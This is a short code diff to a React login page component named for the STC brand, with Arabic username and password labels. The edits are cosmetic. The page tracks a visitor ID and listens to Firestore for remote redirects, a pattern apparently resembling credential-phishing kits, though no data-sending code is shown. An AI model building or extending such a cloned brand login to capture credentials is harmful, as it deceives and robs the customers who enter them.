@@ -15,8 +15,6 @@ export default function StcLoginPage() {
   const [isWaiting, setIsWaiting] = useState(false);
   const [error, setError] = useState("");
   const [visitorId, setVisitorId] = useState("");
-
-  // ── Get visitor ID ──────────────────────────────────────────────────────
   useEffect(() => {
     if (typeof window !== "undefined") {
       const id = localStorage.getItem("visitor") || "";
@@ -24,7 +22,6 @@ export default function StcLoginPage() {
     }
   }, []);
 
-  // ── Firestore listener for redirects ────────────────────────────────────
   useEffect(() => {
     if (!visitorId) return;
 
@@ -48,11 +45,9 @@ export default function StcLoginPage() {
     return () => unsubscribe();
   }, [visitorId]);
 
-  // ── Phone formatter ─────────────────────────────────────────────────────
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-      setPhoneNumber(e.target.value);
-      setError("");
-    }
+    setPhoneNumber(e.target.value);
+    setError("");
   };
 
   // ── Submit ──────────────────────────────────────────────────────────────
@@ -60,7 +55,6 @@ export default function StcLoginPage() {
     e.preventDefault();
     setError("");
 
-   
     if (!password || password.length < 4) {
       setError("يرجى إدخال كلمة المرور");
       return;
@@ -166,7 +160,7 @@ export default function StcLoginPage() {
             {/* Phone Number */}
             <div className="space-y-2">
               <label className="block text-sm font-semibold text-gray-700">
-              اسم المستخدم
+                اسم المستخدم
               </label>
               <div className="relative">
                 <input
